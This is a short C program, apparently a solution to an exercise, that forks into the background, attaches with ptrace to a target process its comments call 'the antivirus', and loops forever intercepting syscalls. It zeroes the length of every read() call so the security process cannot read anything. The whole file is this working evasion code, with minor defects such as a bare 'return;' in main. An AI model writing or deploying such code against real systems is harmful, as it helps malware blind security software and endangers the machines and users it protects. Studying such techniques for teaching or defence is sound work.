#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>

int pid = 0x99999999;


int main(int argc, char **argv) {
   
   
    // Make the malware stop waiting for our output by forking a child process:
    if (fork() != 0) {
        // Kill the parent process so we stop waiting from the malware
        return 0;
    } else {
        // Close the output stream so we stop waiting from the malware
        fclose(stdout);
    }
        perror("stop " );



//fprintf(stderr, "received PID: %d \n",pid);
if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
 {  // Attach to the process
  perror("attach ");
  return;
 }


struct user_regs_struct regs;
int status,r;
waitpid(pid, &status, 0);  // Wait for the process to stop
if (WIFEXITED(status)) { return; }  // Abort if the process exits

//the loop is to remain attached to the antivirus forever and catch any syscall it executes
    while(1)
    {

    //catch the antivirus at any syscall that is trying to execute
    ptrace(PTRACE_SYSCALL, pid, NULL, NULL);  
    waitpid(pid, &status, 0);  // Wait for the process to stop

    // The rest of your code goes here

           //extract the registers value before(sometimes after but its not important) the syscall is executed
            ptrace( PTRACE_GETREGS, pid, NULL, &regs );
            //perror("regs " );
            //fprintf( stderr, "%lX\n", regs.eip );
            //fprintf( stderr, "EAX: %d\n", regs.orig_eax );
             r = regs.orig_eax;

            //check if EAX value is 3, which means read() syscall
            if(r==3)
            {
            //if the syscall is read() change the 'amount to read' argument to 0
              regs.edx=0;
             ptrace( PTRACE_SETREGS, pid, 0, &regs );
            }


        }




    return 0;
}
